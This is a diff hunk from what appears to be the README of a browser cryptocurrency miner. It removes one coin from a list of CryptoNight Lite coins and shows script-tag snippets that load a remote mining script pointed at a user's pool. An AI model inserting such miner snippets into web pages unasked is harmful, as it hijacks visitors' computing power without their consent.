@@ -45,7 +45,7 @@ Win UWP: https://www.microsoft.com/store/apps/9NQ95K22H2ZB?ocid=badge
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/0?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN Lite V7 Coins (2ACoin, ADON Coin, Aeon, BBSCoin, BitcoinNova, BitcoiNote, Bitsum, Bittorium, BytechCoin, Catalyst, Equilibria, IntuCOIN, NashCash, Nibble Classic, Secure Cash, Ultranote, Zent Cash) need ?algo=cn-lite/1
+#### Examples: CN Lite V7 Coins (2ACoin, ADON Coin, BBSCoin, BitcoinNova, BitcoiNote, Bitsum, Bittorium, BytechCoin, Catalyst, Equilibria, IntuCOIN, NashCash, Nibble Classic, Secure Cash, Ultranote, Zent Cash) need ?algo=cn-lite/1
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-lite/1?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
